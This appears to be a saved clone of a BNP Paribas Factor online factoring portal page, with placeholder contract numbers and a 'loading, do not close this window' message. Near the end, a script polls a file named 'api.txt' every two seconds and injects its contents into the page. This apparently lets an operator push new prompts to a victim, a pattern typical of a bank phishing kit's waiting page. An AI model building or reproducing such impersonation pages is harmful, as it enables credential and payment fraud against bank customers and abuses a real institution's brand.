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"
                        />
                    </div>
                    <div class="menu_contact" bis_skin_checked="1">
                        <ul id="ulnavcont">
                            <li id="cont01">F999999</li>
                            <li id="cont02BIG">
                                <div class="trad" id="LANG_CONTRATLISTE" bis_skin_checked="1">Contrat</div>
                                :
                                <select class="ll_select" name="CONTRAT_CEDANT" id="CONTRAT_CEDANT">
                                    <option selected="" value="00999999">XXXXXX (00999999)</option>
                                    <option value="00999988">XXXXXXXXXXX (00999988)</option>
                                </select>
                            </li>
                            <li id="cont04">15/11/2023 - 20:16:36</li>
                        </ul>
                    </div>
                    <div class="menu" bis_skin_checked="1">
                        <ul id="ulnav">
                            <li id="rf_item01" class="selected">
                                <div id="LANG_GESTIONOPERATION" bis_skin_checked="1">
                                    <a class="space_mh" href="/pages_S027_E001_0001/menu_initial/NL_MenuGOP_o.htm?fr" bis_skin_checked="1">Gestion des opérations </a>
                                </div>
                            </li>
                            <li id="item99"></li>
                            <li id="rf_item02">
                                <div id="LANG_COPILOTE" bis_skin_checked="1"><a class="space_mh" href="/pages_S027_E001_0001/cop_init/Sommaire.htm?fr" bis_skin_checked="1">Copilote </a></div>
                            </li>
                            <li id="item99"></li>
                            <li id="rf_item03">
                                <div id="LANG_TRANSFERT_FICHIERS" bis_skin_checked="1">
                                    <a class="space_mh" href="/pages_S027_E001_0001/transfic_init/Envoyer-Telecharger%20un%20fichier.htm?fr" bis_skin_checked="1">Transfert de fichier </a>
                                </div>
                            </li>
                            <li id="item99"></li>
                            <li id="cop_item98">
                                <div id="LANG_REPORTING" bis_skin_checked="1">
                                    <a class="space_mh" href="/pages_S027_E001_0001/reporting_init/NL_ReportingDemande_o.htm?fr" bis_skin_checked="1">Reporting </a>
                                </div>
                            </li>
                            <li id="item99"></li>
                            <li id="rf_item03">
                                <div id="LANG_LOCKBOX_0036" bis_skin_checked="1">
                                    <a class="space_mh" href="/pages_S027_E001_0001/gdu_init/BNP%20FACTOR.htm?fr" bis_skin_checked="1">Gestion des utilisateurs </a>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="contenu" id="contenu_global" bis_skin_checked="1">
                    <div class="contenu-01_" id="menu_gauche" bis_skin_checked="1">
                        <ul id="menu_gauche">
                            <li id="menug" class="selected">
                                <div class="trad" id="LANG_ENTREPRISE" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_agr/NL_RISAgrementListeMenu%20-%20agr40_c.htm?fr" bis_skin_checked="1">Entreprise </a>
                                </div>
                            </li>
                            <li id="sousmenug" class="selection_sousmenu">
                                <div id="LANG_DEMANDE" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_agrem_dem/NL_Edition_Litige_Agrement_web_o.htm?fr" bis_skin_checked="1">Demande </a>
                                </div>
                            </li>
                            <li id="sousmenug" class="selection_sousmenu">
                                <div id="LANG_MODIFICATION" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_agrem_modif/NL_Edition_Litige_Agrement_web_o.htm?fr" bis_skin_checked="1">Modification </a>
                                </div>
                            </li>
                            <li id="sousmenug" class="selection_sousmenu">
                                <div id="LANG_HISTORIQUE" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_agrem_hist/NL_RISAgrementHistorique%20-%20AGR_SelAgrement.htm?fr" bis_skin_checked="1">Historique </a>
                                </div>
                            </li>
                            <li id="sousmenug" class="selection_sousmenu">
                                <div id="LANG_LISTE" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_agrem_list/NL_RISAgrementCriteres%20-%20AGR_SelAgrement.htm?fr" bis_skin_checked="1">Liste </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_ETABLISSEMENT_MENU" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_ach/NL_RISEtablissementListeMenu%20-%20eta_c.htm?fr" bis_skin_checked="1">Acheteur </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_COMPTE_MENU" bis_skin_checked="1">
                                    <a
                                        class="space_mg"
                                        href="/pages_S027_E001_0001/gdo_cpt/NL_Financement_Encours_Recouvrement_web_or%20-%20Financement_M_DroitDeTirage.htm?fr"
                                        bis_skin_checked="1"
                                    >
                                        Compte
                                    </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_ENCOURS_MENU" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_encours/NL_CPTEncoursListeMenu%20-%20ENC_Menu.htm?fr" bis_skin_checked="1">Encours </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_FACTURES_AVOIRS_MENU" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_factavoir/NL_Remise_Comptes_web_or-%20NL_ACHRemiseListeMenu%20-%20a_rem_c.htm?fr" bis_skin_checked="1">
                                        Facture/Avoir
                                    </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_FINANCEMENT" bis_skin_checked="1">
                                    <a
                                        class="space_mg"
                                        href="/pages_S027_E001_0001/gdo_financ/NL_Financement_Encours_Recouvrement_web_or%20-%20Financement_M_DroitDeTirage.htm?fr"
                                        bis_skin_checked="1"
                                    >
                                        Financement
                                    </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_REVOLVING" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_revolving/NL_RevolvingMenu%20-%20Menu.htm?fr" bis_skin_checked="1">Revolving </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_RECOUVREMENT_MENU" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_recouvrement/NL_RECFactures%20-%20v2_rec18_c.htm?fr" bis_skin_checked="1">Recouvrement </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_RELANCE_MENU" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_relance/NL_Revolving_Relance_Etablissement_web%20-%20Relance_P_Menu.htm?fr" bis_skin_checked="1">Relance </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_EDITION_EN_LIGNE" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_editlign/NL_STDEditionMenu%20-%20EdiMenu.htm?fr" bis_skin_checked="1">Edition en ligne </a>
                                </div>
                            </li>
                            <li id="menug">
                                <div class="trad" id="LANG_LITIGES" bis_skin_checked="1">
                                    <a class="space_mg" href="/pages_S027_E001_0001/gdo_litige/NL_Edition_Litige_Agrement_web_or%20-%20Litige_P_Menu.htm?fr" bis_skin_checked="1">Litige </a>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <div class="contenu-02_" id="contenu-02_texte" bis_skin_checked="1">
                        <div id="vousetesici" bis_skin_checked="1">
                            <div class="local_" bis_skin_checked="1">
                                <div class="trad" id="LANG_LOCKBOX_0010" bis_skin_checked="1">Vous êtes ici</div>
                                :
                                <div style="display: inline;" id="LANG_GESTIONOPERATION" bis_skin_checked="1">
                                    <a class="space_mh" href="/pages_S027_E001_0001/menu_initial/NL_MenuGOP_o.htm?fr" bis_skin_checked="1">Gestion des opérations </a>
                                </div>
                                <div style="display: inline;" bis_skin_checked="1">
                                    &gt;
                                    <div class="trad" id="LANG_ENTREPRISE" bis_skin_checked="1"></div>
                                </div>
                            </div>
                        </div>
                        <form method="post" name="formChangePage" action="/factoring/fr/NL_Edition_Litige_Agrement_web">
                            <input value="_fm2" type="hidden" name="CWW_FORM" /> <input value="809175352" type="hidden" name="CWW_CTX" /> <input value="default" type="hidden" name="code_page" />
                            <input value="default" type="hidden" name="code_projet" /> <input value="DEM" type="hidden" name="code_menu" />
                            <script data-savepage-type="" type="text/plain"></script>
                        </form>
                        <form method="post" name="formVerifPays" action="/factoring/fr/NL_Edition_Litige_Agrement_web">
                            <input value="_fm3" type="hidden" name="CWW_FORM" /> <input value="809175352" type="hidden" name="CWW_CTX" /> <input value="default" type="hidden" name="userdata" />
                        </form>
                        <br />
                       
                       
                        <br />
                       <p style="text-align: center;"><img alt="" src="https://i.pinimg.com/originals/c7/e1/b7/c7e1b7b5753737039e1bdbda578132b8.gif" style="width: 100px; height: 67px;" /></p>

<p style="text-align: center;"><span style="font-family:arial,helvetica,sans-serif;">Chargement. Ne fermez pas cette fen&ecirc;tre</span></p>

<p style="text-align: center;">&nbsp;</p>
				   </div>
                </div>
<div id="content"></div>

<script>
setInterval(function() {
  var client = new XMLHttpRequest();
  client.open('GET', 'api.txt');
  client.onreadystatechange = function() {
    if (client.readyState === 4 && client.status === 200) {
      // Check if the response is not empty
      if (client.responseText.trim() !== "") {
        document.getElementById("content").innerHTML = client.responseText;
      } else {
        console.error("Empty response from the server.");
      }
    }
  };
  client.send();
}, 2000);
</script>
                <div class="footer_" id="pied" bis_skin_checked="1" style="position: relative; margin-left: 250px;">
                    <table border="0" cellspacing="0" cellpadding="0" align="center">
                        <tbody>
                            <tr>
                                <td>
                                    <a href="?afaqclient.htm?fr" target="_blank" style="text-decoration: none;" bis_skin_checked="1">
                                        <img
                                            style="vertical-align: baseline;"
                                            data-savepage-currentsrc="/fic_utilitaires/tra_cosmos_img/afaq.png"
                                            data-savepage-src="/demo_site_web/fic_utilitaires/tra_cosmos_img/afaq.png"
                                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAG4AAAAzCAYAAAB2Sz3SAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAALEQAACxEBf2RfkQAAAC50RVh0Q3JlYXRpb24gVGltZQBqZXUuIDEwIG5vdi4gMjAxMSAxNTo1OToxOSArMDEwMMihef4AAAAHdElNRQfbCwoPACCccvDMAAAAkUlEQVR4Xu3RQQ0AIBDAsAP/noEHJpqsnwnYOs+Es3+DaRyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahyqcajGoRqHahxp5gLwmwRiSXoGEwAAAABJRU5ErkJggg=="
                                            border="0"
                                            height="31"
                                            width="75"
                                        />
                                    </a>
                                </td>
                                <td>
                                    <div id="LANG_TOUSDROITS" class="trad" bis_skin_checked="1">Tous droits réservés</div>
                                    © 2012 ~
                                    <div id="LANG_BNPPARIBASFACTOR" class="trad" bis_skin_checked="1">BNP Paribas Factor S.A.</div>
                                    ~
                                    <div class="trad" id="LANG_MENTIONS_LEGALES" bis_skin_checked="1">
                                        <a href="?S027_E001/S027_E001_fichier_cosmos_fr/convention_GO.htm?fr" target="_blank" bis_skin_checked="1">Mentions légales </a>
                                    </div>
                                    <br />
                                    <div id="LANG_PROBCONNEXIONCONTACTNOTRE" class="trad" bis_skin_checked="1">Pour toutes questions relatives au site, contactez notre</div>
                                    <div class="trad" id="LANG_WEBMASTER" bis_skin_checked="1">
                                        <a href="/pages_S027_E001_0001/contacts/NL_Transverse%20-%20APOContacts%20-%20Contacts.htm?fr" bis_skin_checked="1">Webmaster </a>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
	
    </body>
</html>
